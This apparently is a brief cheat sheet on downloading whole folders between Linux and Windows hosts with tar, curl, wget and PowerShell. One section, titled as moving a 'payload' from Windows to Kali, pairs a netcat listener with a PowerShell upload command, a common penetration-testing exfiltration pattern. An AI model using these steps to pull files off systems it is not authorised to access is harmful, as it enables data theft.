✅ How to actually download a whole folder 

Linux ↔ Linux
Option 1 — Download a compressed archive (recommended)
If you control the server, compress the folder first:
On the server:
$ tar -czf folder.tar.gz folder/

On your machine:
$ curl http://<server_ip>:<port>/folder.tar.gz -o folder.tar.gz
$ tar -xzf folder.tar.gz
This is the cleanest and most reliable method.


Option 2 — Use wget with recursive download
If the server exposes directory listings:
$ wget -r http://<server_ip>:<port>/folder/
wget supports recursion; curl does not.

Windows ↔ Linux
PS> Compress-Archive -Path C:\path\to\folder -DestinationPath C:\path\to\folder.zip
cmd> tar -a -c -f C:\path\to\folder.zip C:\path\to\folder
Transfer Payload Window -> Kali
Kali $ sudo nc -lvnp 8080 > folder.zip
Windows PS:> (New-Object Net.WebClient).UploadFile("http://<kali-ip>:8080", "C:\Path\To\folder.zip")
Or
Set up Server on Windows, Then download it with curl:
$ curl http://<server_ip>:<port>/folder.zip -o folder.zip
$ wget -r http://<server_ip>:<port>/folder/



